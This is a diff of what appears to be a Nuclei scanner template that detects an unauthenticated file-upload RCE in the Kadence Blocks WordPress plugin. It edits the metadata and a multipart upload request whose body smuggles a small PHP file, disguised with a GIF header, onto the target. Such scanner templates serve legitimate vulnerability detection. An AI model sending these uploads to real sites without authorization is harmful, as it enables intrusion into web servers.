@@ -10,19 +10,15 @@ info:
   reference:
     - https://wordpress.org/plugins/kadence-blocks/
     - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/kadence-blocks/kadence-blocks-3110-unauthenticated-arbitrary-file-upload
-  classification:
-    cwe-id: CWE-94,CWE-434
   metadata:
     verified: true
     max-request: 2
     publicwww-query: "/wp-content/plugins/kadence-blocks/"
-  tags: rce,wpscan,wordpress,wp-plugin,wp,kadence-blocks,fileupload,intrusive,vuln
-
+  tags: rce,wpscan,wordpress,wp-plugin,wp,kadence-blocks,file-upload,intrusive
 variables:
   str: "{{to_lower(rand_text_alpha(5))}}"
   email: "{{rand_base(8)}}@{{rand_base(5)}}.com"
   filename: "{{to_lower(rand_text_alpha(5))}}"
-  string: "wp-kadence-blocks-rce"
 
 http:
   - raw:
@@ -52,7 +48,7 @@ http:
 
         GIF89a
 
-        <?php echo md5("{{string}}");unlink(__FILE__);?>
+        <?php echo md5("{{randstr}}");?>
         -----------------------------8779924633391890046425977712
         Content-Disposition: form-data; name="_kb_adv_form_post_id"
 
@@ -103,4 +99,5 @@ http:
         regex:
           - 'name="_kb_adv_form_post_id" value="([^"]*)"'
         internal: true
-# digest: 4a0a0047304502203aa5398f5bb2a6e6820ad56787280104ff37c3ddb97cfbe17a886d90904131cd022100dd37d13f746b67d4fe1a38ab7ea22396e9d94a3a718ea9dfca0baff707d31fef:922c64590222798bb761d5b6d8e72950
+
+# digest: 4b0a00483046022100f889dab0efb0786026649601fe4c46143b278fef7e1d49806b792b848b5d8dd20221009095af79faac87f0561640762f75f867fd3944358489cc0f032f1ec47e26ec87:922c64590222798bb761d5b6d8e72950
